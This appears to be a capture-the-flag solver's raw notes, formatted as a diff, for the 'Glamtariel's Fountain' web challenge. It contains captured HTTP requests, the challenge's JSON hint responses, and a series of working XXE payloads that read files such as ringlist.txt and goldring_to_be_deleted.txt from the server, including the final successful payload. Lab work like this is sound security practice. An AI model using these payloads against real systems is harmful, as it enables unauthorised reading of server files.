@@ -1,0 +1,414 @@
+POST /dropped HTTP/2
+Host: glamtarielsfountain.com
+Cookie: MiniLembanh=4aaa3a19-835a-45f7-b535-88de813306b6.CZBTmFOGv1NqbYys7p5WEUoe-3w; GCLB="04ad9de9a7801529"
+Content-Length: 47
+Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
+Accept: application/json
+Content-Type: application/json
+X-Grinchum: IjgyZDU2OGZmMDBiNmU3ZjU1YjkwOTJlMjkwZjM5NzY2YmY4ZTIyYmEi.Y6ottQ.P0TmqjTyWPQ0FEZfuH_X7z6D6AM
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+Sec-Ch-Ua-Platform: "Linux"
+Origin: https://glamtarielsfountain.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://glamtarielsfountain.com/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+{"imgDrop":"img4","who":"none","reqType":"xml"}
+
+{
+  "appResp": "We don't speak that way very often any more. Once in a while perhaps, but only at certain times.^I don't hear her use that very often. I think only for certain TYPEs of thoughts.",
+  "droppedOn": "none",
+  "visit": "none"
+}
+
+Green ring fount
+Careful with the fountain! I know what you were wondering about there. It's no cause for concern. The PATH here is closed!^Between Glamtariel and Kringle, many who have tried to find the PATH here uninvited have ended up very disAPPointed. Please click away that ominous eye!
+glam
+I do have a small ring collection, including one of these.^I think Glamtariel likes rings a little more than she lets on sometimes.
+
+igloo
+The fountain shows many things, some more helpful than others. It can definitely be a poor guide for decisions sometimes.^What's this? Fake tickets to get in here? Snacks that don't taste right? How could that be
+
+"It's understandable to wonder about home when one is adventuring.^I think I'd worry too much if I ever left this place.",
+  "droppedOn": "princess",
+  
+  
+  "Did you know that I speak in many TYPEs of languages? For simplicity, I usually only communicate with this one though.^I pretty much stick to just one TYPE of language, it's a lot easier to share things that way.",
+  "droppedOn": "fountain",
+  
+  
+  "I like to keep track of all my rings using a SIMPLE FORMAT, although I usually don't like to discuss such things.^Glamtariel can be pretty tight lipped about some things.",
+  "droppedOn": "none",
+  
+  "I love these fancy blue rings! You can see I have two of them. Not magical or anything, just really pretty.^If asked, Glamtariel definitely tries to insist that the blue ones are her favorites. I'm not so sure though.",
+  "droppedOn": "none",
+  
+  
+  "I like to keep track of all my rings using a SIMPLE FORMAT, although I usually don't like to discuss such things.^Glamtariel can be pretty tight lipped about some things.",
+  "droppedOn": "none",
+  
+  "Ah, the fiery red ring! I'm definitely proud to have one of them in my collection.^I think Glamtariel might like the red ring just as much as the blue ones, perhaps even a little more.",
+  "droppedOn": "princess",
+  
+  "Hmmm, you seem awfully interested in these rings. Are you looking for something? I know I've heard through the ice cracks that Kringle is missing a special one.^You know, I've heard Glamtariel talk in her sleep about rings using a different TYPE of language. She may be more responsive about them if you ask differently.",
+  "droppedOn": "fountain",
+  
+  "Wow!, what a beautiful silver ring! I don't have one of these. I keep a list of all my rings in my RINGLIST file. Wait a minute! Uh, promise me you won't tell anyone.^I never heard Glamtariel mention a RINGLIST file before. If only there were a way to get a peek at that.",
+  "droppedOn": "none",
+  
+  
+  POST /dropped HTTP/2
+Host: glamtarielsfountain.com
+Cookie: GCLB="101d6c62ecc73bea"; MiniLembanh=dc10d3e1-0638-43c5-a04e-5410fcc49846.I7hnZFdWzaoxzSwsJWEM2PDQ1bg
+Content-Length: 110
+Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
+Accept: application/xml
+X-Grinchum: Ijg0MzUyYzg5ZGRjZGRmMDY4ZmE0ZWM3M2I3YzE1NGEzMzIyNjQ1YTIi.Y6yOsQ.pFQakt8HUOjZnLy2aL0OdhqYrzM
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+Sec-Ch-Ua-Platform: "Linux"
+Origin: https://glamtarielsfountain.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://glamtarielsfountain.com/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Content-Type: application/xml
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+	<!ELEMENT foo ANY >
+	<!ENTITY xxe SYSTEM  "file:///app/static/images/2022_glamtariel_2022.png" >]>
+
+<root>
+<imgDrop>&xxe;</imgDrop>
+<who>princess</who>
+<reqType>xml</reqType>
+</root>
+  
+  https://glamtarielsfountain.com/static/images/pholder-morethantopsupersecret63842.png
+  
+  
+  
+##############################################  
+Success
+
+POST /dropped HTTP/2
+Host: glamtarielsfountain.com
+Cookie: GCLB="101d6c62ecc73bea"; MiniLembanh=40be3a5c-b6b8-4287-9157-e2d7d0544fd8.quTNv8bNmqfHm14l5X_m1tvrg1Q
+Content-Length: 240
+Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
+Accept: application/json
+Content-Type: application/xml
+X-Grinchum: IjM5MzNiNGRhZWU2YzdmMWFlODQyYmY3YmRiOGQ1ZWZlNjE2YmIxZWEi.Y6zEGw.FHO6PMR9-Ct-dhxBhpSjmkpjciY
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+Sec-Ch-Ua-Platform: "Linux"
+Origin: https://glamtarielsfountain.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://glamtarielsfountain.com/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+	<!ELEMENT foo ANY >
+	<!ENTITY xxe SYSTEM  "file:///app/static/images/ringlist.txt" >]>
+
+<root>
+<imgDrop>&xxe;</imgDrop>
+<who>princess</who>
+<reqType>xml</reqType>
+</root> 
+  
+  
+  
+  
+  POST /dropped HTTP/2
+Host: glamtarielsfountain.com
+Cookie: GCLB="101d6c62ecc73bea"; MiniLembanh=40be3a5c-b6b8-4287-9157-e2d7d0544fd8.quTNv8bNmqfHm14l5X_m1tvrg1Q
+Content-Length: 240
+Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
+Accept: application/json
+Content-Type: application/xml
+X-Grinchum: IjM5MzNiNGRhZWU2YzdmMWFlODQyYmY3YmRiOGQ1ZWZlNjE2YmIxZWEi.Y6zEGw.FHO6PMR9-Ct-dhxBhpSjmkpjciY
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+Sec-Ch-Ua-Platform: "Linux"
+Origin: https://glamtarielsfountain.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://glamtarielsfountain.com/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+	<!ELEMENT foo ANY >
+	<!ENTITY xxe SYSTEM  "file:///app/static/images/ringlist.txt" >]>
+
+<root>
+<imgDrop>&xxe;</imgDrop>
+<who>princess</who>
+<reqType>xml</reqType>
+</root>
+
+
+
+  {
+  "appResp": "Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)",
+  "droppedOn": "none",
+  "visit": "static/images/pholder-morethantopsupersecret63842.png,262px,100px"
+}
+
+  
+https://glamtarielsfountain.com/static/images/pholder-morethantopsupersecret63842.png
+  
+  
+  
+  
+  
+  
+  
+  POST /dropped HTTP/2
+Host: glamtarielsfountain.com
+Cookie: GCLB="101d6c62ecc73bea"; MiniLembanh=40be3a5c-b6b8-4287-9157-e2d7d0544fd8.quTNv8bNmqfHm14l5X_m1tvrg1Q
+Content-Length: 263
+Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
+Accept: application/json
+Content-Type: application/xml
+X-Grinchum: IjM5MzNiNGRhZWU2YzdmMWFlODQyYmY3YmRiOGQ1ZWZlNjE2YmIxZWEi.Y6zEGw.FHO6PMR9-Ct-dhxBhpSjmkpjciY
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+Sec-Ch-Ua-Platform: "Linux"
+Origin: https://glamtarielsfountain.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://glamtarielsfountain.com/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+	<!ELEMENT foo ANY >
+	<!ENTITY xxe SYSTEM  "file:///app/static/images/x_phial_pholder_2022/silverring.txt" >]>
+
+<root>
+<imgDrop>&xxe;</imgDrop>
+<who>princess</who>
+<reqType>xml</reqType>
+</root>
+
+
+{
+  "appResp": "I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!",
+  "droppedOn": "none",
+  "visit": "static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px"
+}
+
+  
+  
+  
+  POST /dropped HTTP/2
+Host: glamtarielsfountain.com
+Cookie: GCLB="101d6c62ecc73bea"; MiniLembanh=40be3a5c-b6b8-4287-9157-e2d7d0544fd8.quTNv8bNmqfHm14l5X_m1tvrg1Q
+Content-Length: 261
+Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
+Accept: application/json
+Content-Type: application/xml
+X-Grinchum: IjM5MzNiNGRhZWU2YzdmMWFlODQyYmY3YmRiOGQ1ZWZlNjE2YmIxZWEi.Y6zEGw.FHO6PMR9-Ct-dhxBhpSjmkpjciY
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+Sec-Ch-Ua-Platform: "Linux"
+Origin: https://glamtarielsfountain.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://glamtarielsfountain.com/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+	<!ELEMENT foo ANY >
+	<!ENTITY xxe SYSTEM  "file:///app/static/images/x_phial_pholder_2022/bluering.txt" >]>
+
+<root>
+<imgDrop>&xxe;</imgDrop>
+<who>princess</who>
+<reqType>xml</reqType>
+</root>
+  {
+  "appResp": "I love these fancy blue rings! You can see we have two of them. Not magical or anything, just really pretty.^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.",
+  "droppedOn": "none",
+  "visit": "none"
+}
+
+
+POST /dropped HTTP/2
+Host: glamtarielsfountain.com
+Cookie: GCLB="101d6c62ecc73bea"; MiniLembanh=ab10806b-be65-4e41-b6dd-7003f54917b1.erTe2mQTnxi8X9sfUastyf3XGuM
+Content-Length: 260
+Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
+Accept: application/json
+Content-Type: application/xml
+X-Grinchum: IjM5MGI2OWM4ZDY3ZGI4ZDNhOWU3NDA3NTdjNjE2ZDI4ODdmNTU5NDEi.Y6zvuw.fnS3fK3ZcEMi1bcZdhl-vaFbcoQ
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+Sec-Ch-Ua-Platform: "Linux"
+Origin: https://glamtarielsfountain.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://glamtarielsfountain.com/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+	<!ELEMENT foo ANY >
+	<!ENTITY xxe SYSTEM  "file:///app/static/images/x_phial_pholder_2022/redring.txt" >]>
+
+<root>
+<imgDrop>&xxe;</imgDrop>
+<who>princess</who>
+<reqType>xml</reqType>
+</root>
+{
+  "appResp": "Hmmm, you still seem awfully interested in these rings. I can't blame you, they are pretty nice.^Oooooh, I can just tell she'd like to talk about them some more.",
+  "droppedOn": "none",
+  "visit": "none"
+}
+
+  
+  
+  POST /dropped HTTP/2
+Host: glamtarielsfountain.com
+Cookie: GCLB="101d6c62ecc73bea"; MiniLembanh=40be3a5c-b6b8-4287-9157-e2d7d0544fd8.quTNv8bNmqfHm14l5X_m1tvrg1Q
+Content-Length: 262
+Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
+Accept: application/json
+Content-Type: application/xml
+X-Grinchum: IjM5MzNiNGRhZWU2YzdmMWFlODQyYmY3YmRiOGQ1ZWZlNjE2YmIxZWEi.Y6zEGw.FHO6PMR9-Ct-dhxBhpSjmkpjciY
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+Sec-Ch-Ua-Platform: "Linux"
+Origin: https://glamtarielsfountain.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://glamtarielsfountain.com/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+	<!ELEMENT foo ANY >
+	<!ENTITY xxe SYSTEM  "file:///app/static/images/x_phial_pholder_2022/greenring.txt" >]>
+
+<root>
+<imgDrop>&xxe;</imgDrop>
+<who>princess</who>
+<reqType>xml</reqType>
+</root>
+
+{
+  "appResp": "Hey, who is this guy? He doesn't have a ticket!^I don't remember seeing him in the movies!",
+  "droppedOn": "none",
+  "visit": "static/images/x_phial_pholder_2022/tomb2022-tommyeasteregg3847516894.png,230px,30px"
+}
+  
+  
+POST /dropped HTTP/2
+Host: glamtarielsfountain.com
+Cookie: GCLB="101d6c62ecc73bea"; MiniLembanh=40be3a5c-b6b8-4287-9157-e2d7d0544fd8.quTNv8bNmqfHm14l5X_m1tvrg1Q
+Content-Length: 275
+Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
+Accept: application/json
+Content-Type: application/xml
+X-Grinchum: IjM5MzNiNGRhZWU2YzdmMWFlODQyYmY3YmRiOGQ1ZWZlNjE2YmIxZWEi.Y6zEGw.FHO6PMR9-Ct-dhxBhpSjmkpjciY
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+Sec-Ch-Ua-Platform: "Linux"
+Origin: https://glamtarielsfountain.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://glamtarielsfountain.com/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+	<!ELEMENT foo ANY >
+	<!ENTITY xxe SYSTEM  "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>
+
+<root>
+<imgDrop>&xxe;</imgDrop>
+<who>princess</who>
+<reqType>xml</reqType>
+</root>
+
+{
+  "appResp": "Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.",
+  "droppedOn": "none",
+  "visit": "none"
+}
+
+
+POST /dropped HTTP/2
+Host: glamtarielsfountain.com
+Cookie: GCLB="101d6c62ecc73bea"; MiniLembanh=40be3a5c-b6b8-4287-9157-e2d7d0544fd8.quTNv8bNmqfHm14l5X_m1tvrg1Q
+Content-Length: 276
+Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"
+Accept: application/json
+Content-Type: application/xml
+X-Grinchum: IjM5MzNiNGRhZWU2YzdmMWFlODQyYmY3YmRiOGQ1ZWZlNjE2YmIxZWEi.Y6zEGw.FHO6PMR9-Ct-dhxBhpSjmkpjciY
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+Sec-Ch-Ua-Platform: "Linux"
+Origin: https://glamtarielsfountain.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://glamtarielsfountain.com/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+	<!ELEMENT foo ANY >
+	<!ENTITY xxe SYSTEM  "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt" >]>
+
+<root>
+<imgDrop>img1</imgDrop>
+<who>princess</who>
+<reqType>&xxe;</reqType>
+</root>
+
+{
+  "appResp": "No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!",
+  "droppedOn": "none",
+  "visit": "static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px"
+}
+
+
+
+
+
+
+
+
+
+
+
+
